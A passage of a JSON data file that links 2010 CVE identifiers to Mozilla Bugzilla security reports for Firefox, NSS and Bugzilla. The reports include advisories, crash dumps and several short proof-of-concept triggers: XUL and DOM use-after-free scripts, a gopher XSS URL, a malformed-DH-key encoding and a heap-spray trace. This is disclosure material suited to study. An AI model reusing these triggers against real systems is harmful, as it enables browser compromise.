exception=EXC_BAD_INSTRUCTION:signal=4:is_exploitable=yes:instruction_disassembly=:instruction_address=0x0000000097db24b4:access_type=:access_address=0x0000000000000000: Illegal instruction at 0x0000000097db24b4, probably a exploitable issue. Cheers Marc"
      }
    ],
    "CVE-2010-3166": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=579655",
        "title": "heap overflow in text runs - crash [@ nsTextFrameUtils::TransformText]",
        "description": "wooshi@gmail.com sent the following to the security alias: Firefox exploitable Vulnerability Discovery Date: May 24, 2010 Discovery By : wushi of team509 Systems Affected This vulnerability affects the following software : * mozilla firefox 3.6.6 Overview firefox contains a vulnerability. This vulnerability may allow attackers to remotely execute arbitrary code on the affected system. Exploitation may occur as the result of using the affected webkit application to visit a website. The privileges gained by a remote attacker depend on the software component being attacked. I. Description: unpack the ff4.rar and got the 1.html , use mozilla firefox to open it(I used 3.6.6 on windows xp sp3) firefox will crash. the crash will like this: (de8.9f4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0012b600 ebx=00000000 ecx=00000001 edx=0012daa5 esi=0012b620 edi=00130000 eip=101aca7a esp=0012b17c ebp=04c79a6a iopl=0 nv up ei pl nz ac pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010217 xul!nsTextFrameUtils::TransformText+0x5a: 101aca7a 8807 mov byte ptr [edi],al ds:0023:00130000=41 0:000> kv ChildEBP RetAddr Args to Child 0012b194 101545a0 04c761cc fffffffc 00000002 xul!nsTextFrameUtils::TransformText+0x5a (FPO: [Uses EBP] [5,4,0]) (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\layout\\generic\\nstextframeutils.cpp @ 220] 0012c74c 10137a0c 0012d7d8 0477b058 0012dab0 xul!BuildTextRunsScanner::BuildTextRunForFrames+0x3f0 (FPO: [Uses EBP] [1,1380,4]) (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\layout\\generic\\nstextframethebes.cpp @ 1657] 0012d770 6165696f 0000005d 00000000 00000000 xul!BuildTextRunsScanner::FlushFrames+0xac (FPO: [Uses EBP] [1,1031,3]) (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\layout\\generic\\nstextframethebes.cpp @ 1215] WARNING: Frame IP not in any known module. Following frames may be wrong. 0012d778 00000000 00000000 00000000 00000000 0x6165696f check the source code, you can find this line cause the crash: if (!nowInWhitespace) { if (IsDiscardable(ch, &flags)) { aSkipChars->SkipChar(); nowInWhitespace = inWhitespace; } else { *aOutput++ = ch; ; error is here aSkipChars->KeepChar(); } notice the stack you can find aLength set to 0xfffffffc, it is a mistake. check the xul!BuildTextRunsScanner::BuildTextRunForFrames' source code, you can find the error is here: nsIContent* content = f->GetContent(); const nsTextFragment* frag = content->GetText(); PRInt32 contentStart = mappedFlow->mStartFrame->GetContentOffset(); PRInt32 contentEnd = mappedFlow->GetContentEnd(); PRInt32 contentLength = contentEnd - contentStart; // error is here in the test case, the contentEnd < contentStart , so made the mistake and firefox didn't check the number."
      }
    ],
    "CVE-2010-3167": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=576070",
        "title": "nsTreeContentView Dangling Pointer Remote Code Execution Vulnerability (ZDI-CAN-804)",
        "description": "ZDI-CAN-804: Mozilla Firefox nsTreeContentView Dangling Pointer Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 10, (AV:N/AC:L/Au:N/C:C/I:C/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the implementation of a particular element within the XUL namespace. Due to a method for the element having the side effect of executing javascript, an attacker can provide their own javascript code which can be used to remove an object out from underneath the element's child hierarchy. This can force the application to make an invalid reference when traversing it's internal objects, thus using an illegitimate pointer. This can be leveraged by an attacker to execute arbitrary code under the context of the application. Version(s) tested: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 One of the arguments to nsTreeContentView::GetCell is an nsITreeColumn interface. This gives the function the side effect of being able to execute a method of this object that is provided by the site. In this code, the first point of the variable that can be controlled is located within ChildIterator::Init. layout/xul/base/src/tree/src/nsTreeContentView.cpp:1531 nsIContent* nsTreeContentView::GetCell(nsIContent* aContainer, nsITreeColumn* aCol) { nsCOMPtr<nsIAtom> colAtom; PRInt32 colIndex; aCol->GetAtom(getter_AddRefs(colAtom)); aCol->GetIndex(&colIndex); // XXX // Traverse through cells, try to find the cell by \"ref\" attribute or by cell // index in a row. \"ref\" attribute has higher priority. nsIContent* result = nsnull; PRInt32 j = 0; ChildIterator iter, last; for (ChildIterator::Init(aContainer, &iter, &last); iter != last; ++iter) { nsIContent* cell = *iter; if (cell->Tag() == nsGkAtoms::treecell) { if (colAtom && cell->AttrValueIs(kNameSpaceID_None, nsGkAtoms::ref, colAtom, eCaseMatters)) { result = cell; break; } else if (j == colIndex) { result = cell; } j++; } } return result; } An example of a method that can be used to exploit the side effect in the previously function can be located within ::GetCellValue. If an attacker destroys the row when GetCell is called, then ChildIterator::Init will access it as the unsafe type. layout/xul/base/src/tree/src/nsTreeContentView.cpp:471 NS_IMETHODIMP nsTreeContentView::GetCellValue(PRInt32 aRow, nsITreeColumn* aCol, nsAString& _retval) { _retval.Truncate(); NS_ENSURE_ARG_POINTER(aCol); NS_PRECONDITION(aRow >= 0 && aRow < PRInt32(mRows.Length()), \"bad row\"); if (aRow < 0 || aRow >= PRInt32(mRows.Length())) return NS_ERROR_INVALID_ARG; Row* row = mRows[aRow]; nsIContent* realRow = nsTreeUtils::GetImmediateChild(row->mContent, nsGkAtoms::treerow); if (realRow) { nsIContent* cell = GetCell(realRow, aCol); // XXX if (cell) cell->GetAttr(kNameSpaceID_None, nsGkAtoms::value, _retval); } return NS_OK; } At this point, aContent has been destroyed. layout/base/nsChildIterator.cpp:48 nsresult ChildIterator::Init(nsIContent* aContent, ChildIterator* aFirst, ChildIterator* aLast) { // Initialize out parameters to be equal, in case of failure. aFirst->mContent = aLast->mContent = nsnull; aFirst->mIndex = aLast->mIndex = 0; NS_PRECONDITION(aContent != nsnull, \"no content\"); if (! aContent) return NS_ERROR_NULL_POINTER; nsIDocument* doc = aContent->GetOwnerDoc(); ... -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-3168": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=576075",
        "title": "tree Object Removal Remote Code Execution Vulnerability (ZDI-CAN-817)",
        "description": "ZDI-CAN-817: Mozilla Firefox tree Object Removal Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the support for XUL <tree> objects. If a specific property of a tree object is set and the parent node attempts to remove the child, the process can be made to access invalid memory. This can be abused by an attacker to execute remote code under the context of the user running the browser. Version(s) tested: Mozilla Firefox 3.6.2 Platform(s) tested: Windows XP SP3 x86 <window xmlns=\"http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul\" onload=\"run()\"> <tree> <treecols/> <treechildren/> </tree> <script type=\"text/javascript\"><![CDATA[ function run() { var tree = document.getElementsByTagName(\"tree\")[0]; var view = tree.treeBoxObject.view; view.selection = { isSelected : function(i) { return false; }, set tree(t) { if (t == null) { tree.parentNode.removeChild(tree); } } }; var body = tree.treeBoxObject.treeBody; body.parentNode.removeChild(body); } ]]></script> -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-3170": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=578697",
        "title": "Browser Wildcard Certificate Validation Issue",
        "description": "Not yet certain if this is an NSS issue or PSM issue. Maybe both? I'm intentionally giving this bug a higher severity than it probably deserves, given that CAs trusted by Mozilla won't issue such certs. Received an email today from Richard Moore <rich@kde.org>. Text as follows: > This is an advance notification of an advisory my company will be > releasing at some point in the future. We aim to work with vendors to > achieve simultaneous disclosure, so any comments would be appreciated. > Once I've dug out the various security contacts for the browsers > concerned we will notify them privately as well. Please treat this > information as confidential for now. > Westpoint Security Advisory > --------------------------- > > Title: Multiple Browser Wildcard Cerficate Validation Weakness > Risk Rating: Low > Author: Richard Moore <rich@westpoint.ltd.uk> > Test Cases: Simon Ward <simon@westpoint.ltd.uk> > Date: 14 July 2010 > Advisory ID#: wp-10-0001 > URL: http://www.westpoint.ltd.uk/advisories/wp-10-0001.txt > CVE: not yet assigned > > Details > ------- > > RFC 2818 covers the requirements for matching CNs and subjectAltNames in > order to establish valid SSL connections. It first discusses CNs that are > for hostnames, and the rules for wildcards in this case. The next paragraph > in the RFC then discusses CNs that are IP addresses: > > 'In some cases, the URI is specified as an IP address rather than a > hostname. In this case, the iPAddress subjectAltName must be present > in the certificate and must exactly match the IP in the URI.' > > The intention of the RFC is clearly that you should not be able to use > wildcards with IP addresses (in order to avoid the ability to perform > man-in-the-middle attacks). Unfortunately our testing showed that this > rule is not adhered to by some browsers. > > We created a certificate with the CN '*.168.3.48' this meets the various > rules for wildcards in CNs, but should be treated as invalid since it is > not a hostname. We then observed the errors reported by browsers when > connecting to an https server using this certificate run on IP address > 192.168.3.48. > > We imported the test CA used to sign the certifcate in order to perform > the test. > > The results we saw were as follows: > > IE6 > Regarded the IP address as matching the CN (VULNERABLE) > > IE7 > Regarded the IP address as matching the CN (VULNERABLE) > > Firefox 3.6.6 > Regarded the IP address as matching the CN (VULNERABLE) > > Chrome > Regarded the IP address as matching the CN (VULNERABLE) > > Opera > Regarded the IP address did not match the CN (NOT VULNERABLE) > > Mitigating Factors > ------------------ > > Obviously a good CA should refuse to issue a certificate with the CN as > indicated, however there only need be one CA to issue one in error for > this issue to result in the user getting no warning at all and being > vulnerable to MITM. > > The rules for hostname matching mean that only the first octet of the > IP address can contain a wildcard. This means that you must be able to > control a server that matches the remainder of the IP address of your > target which reduces the risk of this attack being used dramatically. > > Impact > ------ > > If exploited then a MITM attack can be performed allowing the guarantees > SSL provides to be circumvented. > > Timeline > -------- > > 14 July 2010 Limited disclosure to browser developers."
      }
    ],
    "CVE-2010-3171": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=577512",
        "title": "(more) cross-domain information leakage with Math.random()",
        "description": "Amit Klein of Trusteer reports that our previous fixes for bug 464071 and bug 475585 were insufficient and sends the attached paper. He would like to know \"within one (1) week from today, whether you confirm and acknowledge the technical nature of the vulnerabilities described in the attachment. Of course, I'm available for questions/discussions/suggestions at any time. If you need an extension, please let me know in advance.\" He may be disclosing this issue in the future at \"a security conference, in which case I would ask you to defer your own disclosure to a date as close to the conference as possible.\" Abstract -------- While Mozilla attempted to address the issues of cross domain information leakage (through Math.random) in Firefox 3.6.4 (and above), Firefox 3.5.10 and Firefox 4.0 (alpha and beta), there is still a security vulnerability in the way the isolation is implemented, which enables cross domain leakage. In fact, it may make it easier to attack Firefox in some cases, compared to previous versions. Additionally, a concerned is raised on the entropy provided in the seed to the Math.random PRNG, which may enable more powerful attacks."
      }
    ],
    "CVE-2010-3172": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=600464",
        "title": "[SECURITY] Content/Header injection due to non-random multipart/x-mixed-replace boundary",
        "description": "Search result of b.m.o. does not escape \"--------- =_aaaaaaaaaa0\": it is used as boudary of multipart/x-mixed-replace. Attackers can inject boundary of multipart/x-mixed-replace. It may be able to be used for HTTP Header injection. Example: https://bugzilla.mozilla.org/buglist.cgi?query_format=advanced&short_desc=---------%20%3D_aaaaaaaaaa0&short_desc_type=allwordssubstr&resolution=---&resolution=DUPLICATE"
      }
    ],
    "CVE-2010-3173": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=587234",
        "title": "Better error reporting for tiny ephemeral Diffie-Hellman (DHE) keys in Server Key Exchange",
        "description": "The proposed patch adds a new error code SSL_ERROR_WEAK_SERVER_KEY for the dh_p size check in ssl3_HandleServerKeyExchange. Note that Firefox will display the string ssl_error_weak_server_key in its error page. So the name of this error code needs to be descriptive enough and needs to make it clear the server is at fault. We can consider adding a new error code for invalid dh_g and dh_Ys parameters in the same function. Right now we use the default SSL_ERROR_RX_MALFORMED_SERVER_KEY_EXCH, which seems appropriate for invalid DH parameters. Would SSL_ERROR_SERVER_KEY_EXCHANGE_FAILURE be better?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=595300",
        "title": "Update to NSS_3_12_8_RTM in mozilla-central",
        "description": "mozilla-central is using NSS_3_12_8_BETA2. I'd like to update to NSS_3_12_8_BETA3. I summarize the changes between Beta 2 and Beta 3 below for Mozilla drivers. Bug fixes of interest to Mozilla: - Bug 578697: (CVE-2010-3170) Browser Wildcard Certificate Validation Issue - Bug 582575: Add July 2010 batch of roots to NSS - Bug 536640: valgrind warning in DecodeItem (about uninitialized local from nsslowkey_DecodePW) - Bug 588698: SSL deadlock (seen in Thunderbird) - Bug 567134: Use ASLR in NSS if it's available Other important bug fixes: - Bug 587234: Better error reporting and checks for weak server keys in libSSL - Bug 585842: CERT_MakeCANickname returns static string in error case - Bug 586953: CERT_FormatName leaks everything if it can't PORT_Alloc for buf - Bug 586957: CERT_FormatName leaks things if properties exist multiple times - Bug 586967: CERT_CreateCertificate leaks arena if PORT_ArenaZAlloc fails - Bug 587399: crmf_copy_cert_req_msg leaks poolp if newReqMsg = PORT_ArenaZNew fails - Bug 588052: nsslowhash.h missing from dist/public/nss - Bug 587622: print_attr_value calls get_obj_class instead of get_key_type for CKA_KEY_TYPE - Bug 584871: calling SEC_PKCS12DecoderStart with NULL dOpen, dClose, dRead, dWrite, dArg leads to leaks - Bug 584875: Contents of sec_PKCS12EncoderContext are only freed on error handling case. - Bug 587432: NSS_CMSSignerInfo_Sign leaks tmppoolp when things fail - Bug 586697: ssl3_DeriveMasterSecret must not request pVersion when it does Master key derivation for Diffie-Hellman through pkcs11 - Bug 525092: Allow one more SSL function to be called early Minor bug fixes: - Bug 585247: NSS coreconf: Add -rpath-link to LDFLAGS for Maemo/Scratchbox - Bug 586857: Mark SEC_OID_NS_CERT_EXT_SSL_SERVER_NAME as an unsupported certificate extension - Bug 587393: remove JAR_cert_attribute declaration"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=583337",
        "title": "Firefox detects, won't work with, server doing SSL DHE cipher suites with tiny keys",
        "description": "http://www.enbridge.com/mypage The above link caused a malformed SSL handshake in both Minefield nightly and Beta 2. The page loaded properly in Beta 1 and 3.6.8"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=554354",
        "title": "Evil TLS Server can crash all Firefox from (at least) 3.0 ~ 3.6 (windows + linux)",
        "description": "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) When using DHE cipher suites, a correctly crafted server key exchange message will crash Firefox. struct { opaque dh_p<1..2^16-1>; opaque dh_g<1..2^16-1>; opaque dh_Ys<1..2^16-1>; } ServerDHParams; /* Ephemeral DH parameters */ dh_p can be zero length, dh_g can be zero length - but when dh_Ys is zero length; Firefox crashes. example encoding: 00 00 00 00 00 00 Signature on key is validated first - so easiest done by Evil TLS Server(TM). Reproducible: Always Steps to Reproduce: Modify TLS server to send a 0 length dh_Ys. Actual Results: On linux - firefox vanishes. On windows - crash report application comes up. Expected Results: Rejection of invalid dh params. Some similar bad parameters are caught with errors about memory allocation failure."
      }
    ],
    "CVE-2010-3177": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=556734",
        "title": "XSS in gopher parser when parsing hrefs",
        "description": "Robert Święcki of Google Switzerland GmbH reported an XSS in the gopher parser via security@. He also states \"not sure what's the FF same origin policy and whether it's possible to steal cookies or perform XMLHttpRequest(), but it's probably worth fixing\". gopher://glog.fosconetwork.org/0/billets/rejet-hadopi-09-04-2009.?&a=http://www.google.com%27%3CZZ%22%3E%3C/a%3E%3Cscript%3Ealert%283%29%3C/script%3E"
      }
    ],
    "CVE-2010-3178": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=576616",
        "title": "cross-site information disclosure via modal calls",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4 Build Identifier: This site: http://eaea.sirdarckcat.net/weirdyes.php?loc=http://google.com/#//0x.lv/xss.php?plain_xss= Shows a vulnerability that allows an attacker to access some objects it shouldn't (eg. the location object). 1.- Setting the URL of a frame to javascript:LockExecution();InterestingObject; 2.- LockExecution can be alert() or XHR.send(), or XML.open(), etc.. 3.- The attacker then sets the frame's location to the target website. 4.- When the target page finishes loading, the LockExecution function is unlocked, and a new window is created leaking a reference to InterestingObject to the page. 5.- interestingObject.toString() is called by firefox and its result is written in the hosting page. Reproducible: Always Steps to Reproduce: 1. Visit http://eaea.sirdarckcat.net/weirdyes.php?loc=http://google.com/#//0x.lv/xss.php?plain_xss= 2. google.com redirects to www.google.com (poc) 3. eaea.sirdarckcat.net is able to read window.location Actual Results: eaea.sirdarckcat.net is able to read window.location Expected Results: eaea.sirdarckcat.net shouldn't able to read window.location"
      }
    ],
    "CVE-2010-3179": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=583077",
        "title": "Buffer overflow due to uniscribe failure on long text runs",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 When giving document.write() a MASSIVE message, a buffer overflow occurs and writes data to the Call Stack, eventually causing the EIP to be manipulated by Javascript. Reproducible: Always Steps to Reproduce: 1. Open a debugger (I used Debuggy) 2. Visit the web page 3. In the debugger, check the call stack a couple of times Actual Results: I found that 41414141 was written to the call stack, meaning that after normal browser operations, the EIP becomes 41414141 and that obviously leads to code execution, if you change the EIP to point to your shellcode. Expected Results: The browser should have frozen or crashed. This was ONLY tested against windows 7 on an x86 single core processor, results may vary."
      }
    ],
    "CVE-2010-3180": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=588929",
        "title": "Use after free - nsBarProp",
        "description": "Reproduced on 4.0b5pre and 3.6.8. The repro contains this: w = open(1, 1, 1); o = w.locationbar; w.close(); s = ''; setInterval('s += o.visible', 50); http://crash-stats.mozilla.com/report/index/1b83dc24-cdb7-4435-838d-643822100819"
      }
    ],
    "CVE-2010-3183": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=598669",
        "title": "LookupGetterOrSetter Remote Code Execution Vulnerability (ZDI-CAN-929)",
        "description": "Submitted to security@m.o today via ZDI: ------ -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists in js3250.dll. When a JavaObject is created and deleted, there is not a proper sanity check for the LookupGetterorSetter() function, which can result in a dangling pointer being passed to the JS_ValueToId() function. A remote attacker can exploit this vulnerability to execute arbitrary code under the context of the SYSTEM user. Version(s) tested: Mozilla Firefox 3.6.8 Platform(s) tested: Windows XP SP3 x86 From js/src/xpconnect/src/xpcquickstubs.cpp: JSBool xpc_qsDefineQuickStubs(JSContext *cx, JSObject *proto, uintN flags, PRUint32 ifacec, const nsIID **interfaces, PRUint32 tableSize, const xpc_qsHashEntry *table) { ... static JSFunctionSpec getterfns[] = { JS_FN(\"__lookupGetter__\", SharedLookupGetter, 1, 0), JS_FN(\"__lookupSetter__\", SharedLookupSetter, 1, 0), JS_FN(\"__defineGetter__\", SharedDefineGetter, 2, 0), JS_FN(\"__defineSetter__\", SharedDefineSetter, 2, 0), JS_FS_END }; if(definedProperty && !JS_DefineFunctions(cx, proto, getterfns)) return JS_FALSE; return JS_TRUE; } static JSBool SharedLookupGetter(JSContext *cx, uintN argc, jsval *vp) { return LookupGetterOrSetter(cx, PR_TRUE, vp); } static JSBool LookupGetterOrSetter(JSContext *cx, JSBool wantGetter, jsval *vp) { ... JSObject *obj = JS_THIS_OBJECT(cx, vp); if (!obj) return JS_FALSE; jsval idval = JS_ARGV(cx, vp)[0]; const char *name = JSVAL_IS_STRING(idval) ? JS_GetStringBytes(JSVAL_TO_STRING(idval)) : nsnull; if(!JS_ValueToId(cx, idval, &interned_id) || !JS_LookupPropertyWithFlagsById(cx, obj, interned_id, JSRESOLVE_QUALIFIED, &obj2, &v) || (obj2 && !JS_GetPropertyAttrsGetterAndSetterById(cx, obj2, interned_id, &attrs, &found, &getter, &setter))) return JS_FALSE; ... } Function LookupGetterOrSetter() lacks important sanity check: it assumes that there was at least one argument passed from caller. When __lookupGetter__ is called with no arguments on JavaScript stack, JS_ARGV(cx, vp)[0] returns jsval which represents potentially uninitialized memory (or some leftovers from previous computations?). This, for example, can be a pointer to already freed JS object. Such dangling pointer is later passed to JS_ValueToId(). <<<<<<EDX gets the value 0c0c0c0c, which will soon be called>>>>>>> 0:000> p eax=0012cb58 ebx=02deb800 ecx=0012cbf0 edx=08000001 esi=0012cbd0 edi=0012cbf0 eip=0031cc2b esp=0012caf0 ebp=0012cb4c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 js3250!JS_ComputeThis+0x8eb: 0031cc2b 50 push eax 0:000> dc edx 08000001 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000011 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000021 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000031 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000041 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000051 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000061 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ 08000071 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ................ <<<<<<The function that is responsible for calling into EDX>>>>>> sub_31CC20 proc near arg_0= dword ptr 4 arg_4= dword ptr 8 arg_8= dword ptr 0Ch mov eax, [ecx] ; 00312494 mov edx, [eax] mov eax, [esp+arg_8] mov edx, [edx+20h] push eax mov eax, [esp+4+arg_4] push eax push ecx mov ecx, [esp+0Ch+arg_0] push ecx call edx ; calls the value in edx ; in this case edx = 0c0c0c0c -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-3399": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=475585",
        "title": "Re-seed Math.random() for each window/frame/context",
        "description": "After discussion today, we agreed that it would be nice if each context got its own Math.random() seed, to reduce the risk of things like cross-site tracking based on randomness seed."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=577512",
        "title": "(more) cross-domain information leakage with Math.random()",
        "description": "Amit Klein of Trusteer reports that our previous fixes for bug 464071 and bug 475585 were insufficient and sends the attached paper. He would like to know \"within one (1) week from today, whether you confirm and acknowledge the technical nature of the vulnerabilities described in the attachment. Of course, I'm available for questions/discussions/suggestions at any time. If you need an extension, please let me know in advance.\" He may be disclosing this issue in the future at \"a security conference, in which case I would ask you to defer your own disclosure to a date as close to the conference as possible.\" Abstract -------- While Mozilla attempted to address the issues of cross domain information leakage (through Math.random) in Firefox 3.6.4 (and above), Firefox 3.5.10 and Firefox 4.0 (alpha and beta), there is still a security vulnerability in the way the isolation is implemented, which enables cross domain leakage. In fact, it may make it easier to attack Firefox in some cases, compared to previous versions. Additionally, a concerned is raised on the entropy provided in the seed to the Math.random PRNG, which may enable more powerful attacks."
      }
    ],
    "CVE-2010-3400": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=475585",
        "title": "Re-seed Math.random() for each window/frame/context",
        "description": "After discussion today, we agreed that it would be nice if each context got its own Math.random() seed, to reduce the risk of things like cross-site tracking based on randomness seed."
      }
    ],
    "CVE-2010-3764": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=419014",
        "title": "[SECURITY] Old charts are not project specific, and product names are viewable in graphs/",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12 Build Identifier: Bugzilla 3.0.3 If you run two or more projects of Bugzilla on one codebase, the chart created by reports.cgi are saved into ./graphs, not in ./graphs/<project>/. So if you let create the chart of \"project_1\" (-All-_NEW_ASSIGNED_REOPENED_UNCONFIRMED) und then do the same procedure in \"project_2\", you will see _exactly_ the same chart! That is because the reports.cgi only creates new versions of chart, if there's no old file with the composed filename. Reproducible: Always Steps to Reproduce: 1. Execute reports.cgi with product \"-All-\" in one project 2. Execute reports.cgi with product \"-All-\" in another project. 3. Compare chart urls (spoiler: it will be the same) Actual Results: Both charts are the same, even if there are _no similarities_ between the two projects. Bugzilla creates for multiple projects just one chart (for each product). Expected Results: Bugzilla should create the charts per project, so that the order hierarchie look like this: *graphs *project_1 *-All-_NEW_ASSIGNED_REOPENED_UNCONFIRMED.png *project_2 *-All-_NEW_ASSIGNED_REOPENED_UNCONFIRMED.png *... some other charts ..."
      }
    ],
    "CVE-2010-3765": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=607222",
        "title": "Interleaving document.write and appendChild can lead to duplicate text frames and overrunning of text run buffers",
        "description": "Morten Kråkvik of Telenor SOC reported an in-the-wild 0day affecting Firefox 3.6.x on Windows to security@: ========================================================================= A compromised site is currently redirecting visitors to hxxp://l-3com.dyndns-work.com/admissions/admin.php, which contains exploits directed at Firefox users on Windows. The exploit is confirmed successful on Windows XP SP3 + Firefox 3.6.11."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=607222#c53",
        "title": "Interleaving document.write and appendChild can lead to duplicate text frames and overrunning of text run buffers",
        "description": "Morten Kråkvik of Telenor SOC reported an in-the-wild 0day affecting Firefox 3.6.x on Windows to security@: ========================================================================= A compromised site is currently redirecting visitors to hxxp://l-3com.dyndns-work.com/admissions/admin.php, which contains exploits directed at Firefox users on Windows. The exploit is confirmed successful on Windows XP SP3 + Firefox 3.6.11."
      }
    ],
    "CVE-2010-3766": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=590771",
        "title": "nsDOMAttribute MutationObserver Remote Code Execution Vulnerability (ZDI-CAN-898)",
        "description": "ZDI-CAN-898: Mozilla Firefox nsDOMAttribute MutationObserver Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 10, (AV:N/AC:L/Au:N/C:C/I:C/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the application's support of an API used for element traversal. Due to a particular element not implementing functionality required by the API, a use-after free vulnerability can be made to occur. This can be used to achieve code execution under the context of the application. The issue occurs within the application's support of the NodeIterator API that is used for DOM Traversal as outlined in the DOM specification on w3.org. In order to support the node iteration, the application needs to keep track of modifications to the dom tree in order to update the state of the iterator. This is done explicitly by a pair of methods called AddMutationObserver/RemoveMutationObserver. Anytime an element is created, the observer list will be updated so that a node iterator can adjust for modified elements. When adding an element, it will need to update the MutationObserver list as in the following code. content/base/src/nsNodeIterator.cpp:185 nsNodeIterator::nsNodeIterator(nsINode *aRoot, PRUint32 aWhatToShow, nsIDOMNodeFilter *aFilter, PRBool aExpandEntityReferences) : nsTraversal(aRoot, aWhatToShow, aFilter, aExpandEntityReferences), mDetached(PR_FALSE), mPointer(mRoot, PR_TRUE) { aRoot->AddMutationObserver(this); // XXX } nsNodeIterator::~nsNodeIterator() { /* destructor code */ if (!mDetached && mRoot) mRoot->RemoveMutationObserver(this); // XXX } AddMutationObserver/RemoveMutationObserver will add the provided element to a page-global list that can be queried by the NodeIterator. content/base/src/nsGenericElement.cpp:295 void nsINode::AddMutationObserver(nsIMutationObserver* aMutationObserver) { nsSlots* slots = GetSlots(); if (slots) { slots->mMutationObservers.AppendElementUnlessExists(aMutationObserver); } } void nsINode::RemoveMutationObserver(nsIMutationObserver* aMutationObserver) { nsSlots* slots = GetExistingSlots(); if (slots) { slots->mMutationObservers.RemoveElement(aMutationObserver); } } One element however does not update the mutation list. This is the nsDOMAttribute and is defined in content/base/src/nsDOMAttribute.cpp. This will allow someone to manipulate the nsDOMAttribute node without the nsNodeIterator api being informed. This will bypass the type-safety of the compiler and can lead to code execution. Version(s) tested: Mozilla Firefox Platform(s) tested: Windows XP SP3 -- 